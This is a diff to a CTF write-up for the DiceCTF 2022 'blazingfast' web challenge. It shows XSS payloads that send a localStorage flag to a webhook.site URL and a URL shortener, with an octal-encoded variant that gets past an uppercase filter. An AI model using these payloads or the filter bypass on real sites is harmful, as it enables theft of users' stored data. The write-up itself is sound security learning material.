@@ -506,22 +506,28 @@ Then, we remove the part with the payload and left the valid offset. Call the fu
 
 Now moving into crafting a payload. We have to steal the flag value from localstorage with a payload like this:
 
+```
 https://blazingfast.mc.ax/?demo=.....<img src=x onerror="location.href='https://webhook.site/9ed73e58-c688-47c5-9ec8-826693de1421?c='+localStorage.getItem('flag')">
+```
 
 After having some tries on figuring out how to overcome the uppercase characters, RazviOverflow came across a great idea for the URL, using a URL shortener:
 
+```
 https://blazingfast.mc.ax/?demo=.....<img src=x onerror="location.href='http://tiny.cc/70pouz?c='+localStorage.getItem('flag')">
+```
 
 Still didn't work, since location.href or other methos like this.src didn't work out in uppercase, therefore we still need a bypass for that.
 
 Looking for a solution we tried using some octal bypasses:
 
+```
 https://blazingfast.mc.ax/?demo=.....<img src=x onerror=[][filter][constructor](location.href='http://tiny.cc/70pouz?c='+localStorage.getItem('flag'))()>
-
+```
 To octal:
 
+```
 https://blazingfast.mc.ax/?demo=.....<img src=x onerror=[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\154\157\143\141\164\151\157\156\56\150\162\145\146\75\47\150\164\164\160\72\57\57\164\151\156\171\56\143\143\57\67\60\160\157\165\172\77\143\75\47\53\154\157\143\141\154\123\164\157\162\141\147\145\56\147\145\164\111\164\145\155\50\47\146\154\141\147\47\51")()>
-
+```
 Then we bypassed the uppercase filter and got our local exploit using the URL parameter and changing the payload length:
 
 <img src="/images/writeups/DiceCTF2022/Web/2_02.png" width="70%"/>
